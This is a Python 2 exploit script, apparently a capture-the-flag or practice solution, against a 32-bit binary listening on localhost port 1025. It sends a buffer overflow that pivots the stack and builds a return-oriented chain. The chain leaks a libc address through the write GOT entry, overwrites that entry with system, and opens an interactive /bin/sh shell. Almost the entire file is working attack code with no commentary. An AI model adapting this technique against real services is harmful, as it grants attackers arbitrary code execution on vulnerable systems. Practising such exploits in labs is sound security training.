#! /usr/local/pyenv/shims/python
# _*_ coding: utf-8 _*_
import struct, socket, sys, os
import time, telnetlib, hexdump

# -------- common function --------
def sock(host, port):
  s = socket.create_connection((host, port))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delm='\n'):
  data = ''
  while not data.endswith(delm):
    data += f.readline()
  return data

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

def p(a):
  return struct.pack("<I", a&0xffffffff)

def u(a):
  return struct.unpack("<I", a)[0]

def xxd(a):
  hexdump.hexdump(a)

def countdown(n):
  for i in xrange(n, 0, -1):
    print str(i) + "..",
    sys.stdout.flush()
    time.sleep(1)
  print

def dbg(ss):
  print "[+] %s: 0x%x"%(ss, eval(ss))

# ------------- main --------------

write_plt = 0x0804830c
read_plt = 0x0804832c
write_got = 0x8049614

offset_system = 0x0003ada0
offset_write = 0x000d59f0

p3ret = 0x080484b6
pop_ebp = 0x080483c3
leave = 0x080482ea

data = 0x08049620 
bss = 0x08049628 + 0x300

s, f = sock("localhost", 1025)

# stage2
buf2 = p(write_plt) + p(p3ret) + p(1) + p(write_got) + p(4)
buf2 += p(read_plt) + p(p3ret) + p(0) + p(data) + p(8)
buf2 += p(read_plt) + p(p3ret) + p(0) + p(write_got) + p(4)
buf2 += p(write_plt) + p(0xdeadbeef) + p(data)

buf = "A"*128
buf += p(0xdeadbeef)
buf += p(0xdeadbeef)
# stage1
buf += p(bss - 4)
buf += p(read_plt) + p(leave) + p(0) + p(bss) + p(len(buf2))

f.write(buf)

f.write(buf2)

libc_system = u(f.read(4)) - offset_write + offset_system

dbg("libc_system")

f.write("/bin/sh\0")

f.write(p(libc_system))

shell(s)

